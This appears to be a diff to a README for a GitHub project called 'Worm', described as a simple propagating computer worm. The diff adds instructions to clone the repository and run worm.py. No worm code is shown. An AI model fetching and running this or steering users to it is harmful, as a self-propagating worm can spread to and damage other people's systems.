@@ -1,7 +1,12 @@
 # Worm
 This is a simple propagating computer worm.
-To run just do 
-```Python
+To run just do
+
+```Bash
+git clone https://github.com/CyberGhostShadow/Worm
+```
+then
+```Bash
 python worm.py
 ```
 
